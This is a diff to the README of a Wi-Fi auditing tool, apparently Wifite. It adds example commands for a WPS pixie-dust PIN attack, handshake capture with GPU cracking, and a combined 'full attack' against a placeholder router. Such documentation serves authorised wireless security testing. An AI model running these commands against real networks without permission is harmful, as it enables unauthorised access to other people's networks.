@@ -160,3 +160,32 @@ Cracking a weak WEP password (using the WEP Replay attack):
 
 Cracking a pre-captured handshake using John The Ripper (via the `--crack` option):
 ![--crack option](https://i.imgur.com/iHcfCjp.gif)
+
+
+# WPS PIN Attack
+python3 -m wifite.wifite_advanced \
+  -t AA:BB:CC:DD:EE:FF \
+  -s "RouterName" \
+  -c 6 \
+  -m wps \
+  --pixie-dust
+
+# Handshake Capture + Crack
+python3 -m wifite.wifite_advanced \
+  -t AA:BB:CC:DD:EE:FF \
+  -s "RouterName" \
+  -c 6 \
+  -m handshake \
+  --crack \
+  --gpu
+
+# Full Attack
+python3 -m wifite.wifite_advanced \
+  -t AA:BB:CC:DD:EE:FF \
+  -s "RouterName" \
+  -c 6 \
+  -m both \
+  --timeout 300 \
+  --crack-timeout 600 \
+  --threads 8 \
+  -v
